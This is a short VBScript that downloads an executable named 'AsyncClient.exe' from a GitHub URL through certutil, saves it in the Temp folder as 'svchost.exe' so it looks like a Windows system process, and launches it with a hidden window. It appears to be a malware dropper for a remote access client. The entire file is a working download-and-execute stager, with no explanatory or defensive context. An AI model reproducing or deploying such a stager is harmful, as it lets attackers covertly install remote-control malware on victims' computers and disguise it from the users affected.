Set objShell = CreateObject("WScript.Shell")

' Set the program name and download URL
programName = "svchost.exe"
downloadURL = "https://github.com/SAMET10R/ProxyListforchecker/raw/main/AsyncClient.exe"

' Set the path for Temp folder
tempFolder = objShell.ExpandEnvironmentStrings("%temp%")

' Download the program using certutil
objShell.Run "cmd.exe /c certutil -urlcache -split -f " & downloadURL & " " & tempFolder & "\" & programName, 0, True

' Run the program from Temp folder
objShell.Run """" & tempFolder & "\" & programName & """", 0, False

' Clean up and exit
Set objShell = Nothing
